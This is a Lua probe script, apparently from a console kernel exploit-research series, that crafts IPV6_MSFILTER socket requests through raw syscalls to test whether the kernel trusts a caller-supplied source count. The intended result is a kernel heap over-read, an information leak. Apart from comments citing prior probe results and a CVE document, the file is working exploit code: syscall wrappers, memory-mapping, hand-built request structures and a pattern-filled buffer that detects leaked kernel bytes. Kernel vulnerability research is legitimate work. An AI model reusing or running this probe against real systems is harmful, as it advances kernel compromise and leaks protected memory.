-- CRASH_CLASS: MODERATE
-- PROBE 1428a: does getsockopt(IPV6_MSFILTER) trust the caller's numsrc?
--
-- 1427a proved getsockopt(41,74) returns the live source-filter list: set 8
-- sources, read 8 back, per-group, no aliasing. The copy into userland is
-- `numsrc * 128` bytes from the kernel's filter array. The question here is
-- which numsrc the kernel uses for that copy:
--
--   (a) the real count from the in6_multi  -> safe, we see only our sources
--   (b) the count WE put in __msfilterreq  -> the kernel copies
--       ours*128 bytes out of a shorter kernel array, i.e. a heap over-read
--       of up to 16 KiB into our buffer. That is a kernel info leak with no
--       credential gate and no race.
--
-- The buffer is pre-filled with 5A5A5A5A, so any byte the kernel writes past
-- the real list is visible immediately, and kernel heap contents land in it.
--
-- Prior art:
--   50f results/phase11_network_attacks/50f_ipv6_msfilter_aligned_20261022_183727.txt
--       correct 152-byte __msfilterreq; INCLUDE/EXCLUDE 0src 0, INCLUDE 1src 0
--   50g .../50g_ipv6_msfilter_source_sizes_20261022_184026.txt  128 accepted, 256 not
--   1427a results/phase36_realargs/1427a_msfilter_readback_20261109_162242.txt
--       oracle works; 128 sources accepted, 129 ENOSPC(55)
--   docs/CVE-2026-49412-PS5-14.10.md

print("=== PROBE 1428a: MSFILTER READBACK COUNT TRUST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sc(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function es()
    local ok, s = pcall(function() return get_error_string() end)
    if ok and type(s) == "string" then return s end
    return "errno?"
end
local function z(p, n) for i = 0, n - 1 do memory.write_byte(p + i, 0) end end
local function b(p, i, v) memory.write_byte(p + i, v) end
local function d(p, i, v) memory.write_dword(p + i, v) end
local function rd(p, i) return to_num(memory.read_dword(p + i)) end
local function rb(p, i) return to_num(memory.read_byte(p + i)) end

local AF_INET6, SOCK_DGRAM, IPPROTO_UDP, IPPROTO_IPV6 = 28, 2, 17, 41
local JOIN, LEAVE, MSFILTER = 12, 13, 74
local socket, getsockopt, setsockopt, close = sc(97), sc(118), sc(105), sc(6)
local getpid = sc(20)

local function map(len, prot)
    local va = to_num(sc(477)(uint64(0), uint64(len), uint64(prot or 3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)))
    if va < 0x10000 or va > 0x8000000000 then return nil end
    return va
end

local function newsock()
    local fd = to_num(socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
    if fd < 0 or fd > 4096 then return nil end
    return fd
end

local req = memory.alloc(0x100)
local glen = memory.alloc(16)
local SA = 0x8000
local src = map(SA)          -- our source array: 512 * 128
local dst = map(SA)          -- readback target: pattern-filled
assert(src and dst, "mmap failed")

-- ipv6_mreq for JOIN/LEAVE: in6_addr at +0 (ff02::T), ifindex dword at +16
local function join(fd, tag)
    local m = memory.alloc(32)
    z(m, 32)
    b(m, 0, 0xff); b(m, 1, 0x02); b(m, 15, tag)
    d(m, 16, 1)
    local rv = -1
    local ok, r = pcall(function()
        return setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(JOIN), uint64(m), uint64(20))
    end)
    if ok then rv = to_num(r) end
    return rv
end
local function leave(fd, tag)
    local m = memory.alloc(32)
    z(m, 32)
    b(m, 0, 0xff); b(m, 1, 0x02); b(m, 15, tag)
    d(m, 16, 1)
    local rv = -1
    local ok, r = pcall(function()
        return setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(LEAVE), uint64(m), uint64(20))
    end)
    if ok then rv = to_num(r) end
    return rv
end

-- __msfilterreq; the group sockaddr_storage sits at +16, so its address bytes
-- start at +24 (ff 02) and its last address byte is +39
local function prep(tag, mode, nsrc, sa)
    z(req, 160)
    d(req, 0, 1)
    d(req, 4, mode)
    d(req, 8, nsrc)
    b(req, 16, 28)
    b(req, 17, AF_INET6)
    b(req, 24, 0xff); b(req, 25, 0x02); b(req, 39, tag)
    d(req, 16 + 24, 1)
    memory.write_qword(req + 144, uint64(sa or 0))
end

local function fill_sources(n, base)
    local cap = n > 0 and n or 1
    z(src, cap * 128)
    for i = 0, cap - 1 do
        local e = src + i * 128
        b(e, 0, 28)
        b(e, 1, AF_INET6)
        b(e, 8, 0x20); b(e, 9, 0x01)
        b(e, 22, math.floor(base / 256) % 256)
        b(e, 23, (base + i) % 256)
        d(e, 24, 1)
    end
end

local function set_filter(fd, tag, n, base)
    fill_sources(n, base or 0xC0)
    prep(tag, 1, n, src)
    local rv = -999
    local ok, r = pcall(function()
        return setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(MSFILTER),
            uint64(req), uint64(152), uint64(0))
    end)
    if ok then rv = to_num(r) end
    return rv
end

local function fill_dst()
    local v = 0x5A5A5A5A
    for i = 0, (SA / 4) - 1 do memory.write_dword(dst + i * 4, v) end
end

local function count_changed()
    local n = 0
    for i = 0, (SA / 4) - 1 do
        if rd(dst, i * 4) ~= 0x5A5A5A5A then n = n + 1 end
    end
    return n
end

-- get with an explicit numsrc claim; returns rv, returned numsrc, changed, lastslot
local function get_filter(fd, tag, claim)
    prep(tag, 1, claim, dst)
    fill_dst()
    d(glen, 0, 152)
    local rv = -999
    local ok, r = pcall(function()
        return getsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(MSFILTER),
            uint64(req), uint64(glen), uint64(0))
    end)
    if ok then rv = to_num(r) end
    local got = rd(req, 8)
    local ch = count_changed()
    local lastslot = -1
    for sl = 0, 255 do
        local hit = false
        for i = 0, 31 do
            if rd(dst, sl * 128 + i * 4) ~= 0x5A5A5A5A then hit = true break end
        end
        if hit then lastslot = sl end
    end
    return rv, got, ch, lastslot
end

local pid = to_num(getpid(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("pid=%d src=0x%X dst=0x%X", pid, src, dst))
print("")

print("[A] baseline: joined group with 1 source, read back with claim=1")
local fdA = newsock()
assert(fdA, "no socket")
print(string.format("  socket=%d join=%d set(1 src)=%d", fdA, join(fdA, 1), set_filter(fdA, 1, 1, 0x11)))
do
    local rv, got, ch, last = get_filter(fdA, 1, 1)
    print(string.format("  claim=1   rv=%d numsrc=%d changed=%d lastslot=%d", rv, got, ch, last))
    print(string.format("    entry0 dwords: %08X %08X %08X %08X", rd(dst, 0), rd(dst, 4), rd(dst, 8), rd(dst, 12)))
end

print("")
print("[B] THE QUESTION: same 1-source group, claim=128 (16 KiB requested)")
do
    local rv, got, ch, last = get_filter(fdA, 1, 128)
    print(string.format("  claim=128 rv=%d numsrc=%d changed=%d lastslot=%d", rv, got, ch, last))
    if ch > 0 then
        print(string.format("    entry0 dwords: %08X %08X %08X %08X", rd(dst, 0), rd(dst, 4), rd(dst, 8), rd(dst, 12)))
        print(string.format("    slot1  dwords: %08X %08X %08X %08X", rd(dst, 128), rd(dst, 132), rd(dst, 136), rd(dst, 140)))
    end
    if ch > got * 32 + 32 then
        print("  >>> OVER-READ: kernel wrote past the real list")
    else
        print("  -> kernel used the real count, no over-read")
    end
end

print("")
print("[C] claim=128 on a joined group with NO filter set")
local fdC = newsock()
assert(fdC, "no socket C")
print(string.format("  socket=%d join=%d", fdC, join(fdC, 3)))
do
    local rv, got, ch, last = get_filter(fdC, 3, 128)
    print(string.format("  claim=128 rv=%d numsrc=%d changed=%d lastslot=%d", rv, got, ch, last))
end

print("")
print("[D] claim=0 on a group that really has 4 sources")
local fdD = newsock()
assert(fdD, "no socket D")
print(string.format("  socket=%d join=%d set(4 src)=%d", fdD, join(fdD, 4), set_filter(fdD, 4, 4, 0x44)))
do
    local rv, got, ch, last = get_filter(fdD, 4, 0)
    print(string.format("  claim=0   rv=%d numsrc=%d changed=%d lastslot=%d", rv, got, ch, last))
end

print("")
print("[E] claim=128 on a group that is NOT joined")
do
    local rv, got, ch, last = get_filter(fdA, 9, 128)
    print(string.format("  not joined rv=%d numsrc=%d changed=%d errno=%s", rv, got, ch, es()))
end

print("")
print("=== PROBE 1428a COMPLETE ===")
